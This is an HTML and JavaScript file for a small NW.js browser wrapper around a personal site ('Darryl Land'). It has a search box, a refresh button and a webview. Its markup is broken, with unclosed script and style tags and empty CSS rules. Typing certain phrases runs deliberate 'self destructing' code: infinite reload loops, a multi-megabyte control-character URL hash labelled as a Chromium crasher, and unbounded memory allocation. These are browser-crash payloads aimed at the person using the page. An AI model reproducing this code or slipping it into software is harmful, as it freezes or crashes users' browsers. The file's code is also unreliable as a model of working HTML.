<script>
function refreshing() {
    document.getElementById("mainthing").style.height = window.innerHeight + "px";

    document.getElementById("mainthing").src = document.getElementById("mainthing").src;

 <style>
h1, p, .topnav, a, h3, button, form, input{ 
 font-family:Patrick Hand, cursive, Arial, sans-serif;

 body {

#search-input {

:root {
  --width:100px;

}

#button-norm {
    padding: 10px 20px;
    border: 1px solid #000000;
    background-color: white;
    color: #512da8;
    border-radius: 25px 25px 25px 25px;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s;
}

.highlight {
  background-color: #512da8; /* Example highlight color */
  color: white; /* Example text color for highlighted text */
}

.ball {
  width: var(--width);
  height: var(--height);
  background: url('https://lh3.googleusercontent.com/a/ACg8ocLcvb2kL1RJ4n70pSG29b0UhkS3hY9yUkwnsm_pqUnZZ3td5w=s96-c');
  background-size: contain;
  background-repeat: no-repeat;
  position:absolute;

  animation: toRight linear 6.8s infinite alternate, bounce linear 17s infinite alternate;
}

@keyframes bounce {
  0% {
    top:0;
  }
  48% {
  }
  50% {
    top: calc(100% - var(--height));
  }
  52% {
  }
  100% {
    top: 0;
  }
}

@keyframes toRight {

  0% {
    left: 0;
  }

  100% {
    left: calc(100% - var(--width));
  }
}

<body>
<form id="search-form">
            <button id="button-norm" onclick="refreshing()">Refresh</button>
            <input type="text" id="search-input" placeholder="Search Google or enter a URL..." autofocus>
            <button type="submit" id="search-button">Search</button>
        </form>
<webview id="mainthing" src="https://darrylland.great-site.net"></webview>
<script>
    document.addEventListener('DOMContentLoaded', () => {
    nw.Window.get().maximize();
    const searchForm = document.getElementById('search-form');
    const searchInput = document.getElementById('search-input');
    document.getElementById("mainthing").style.height = window.innerHeight + "px";
    document.getElementById("mainthing").style.width = window.innerWidth + "px";
    searchForm.addEventListener('submit', (event) => {
        event.preventDefault(); 

        const query = searchInput.value.trim();

        if (query) {
            let urlToValidate = query;
            if (!query.startsWith('http')) {
                urlToValidate = `https://${query}`;
            }

            let isUrl = false;
            try {
                
                new URL(urlToValidate);
                isUrl = true;
            } catch (e) {
                isUrl = false;
            }

            if (isUrl && query.includes('.')) {
                
                document.getElementById("mainthing").src = urlToValidate;
            } else if (query.includes("hate darryl land") || query.includes("destroy darryl land")) {
              while(1)location.reload(1);
              //This is self destructing code for chromium
              window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
              //This is self destructing code for safari
              die();
              die();
              let arr = [];
              while (true) {
                  arr.push(new Array(1000000).join('a')); // Allocate a large string repeatedly
              }  
              //This is self destructing code for firefox
              while(1)console.log("Self Destruction Failed");
              //This is when things just dosent work
            } else {
                
                const googleSearchUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
                document.getElementById("mainthing").src = googleSearchUrl;
            }
        }
    });
console.log("10thing");
});
</script>
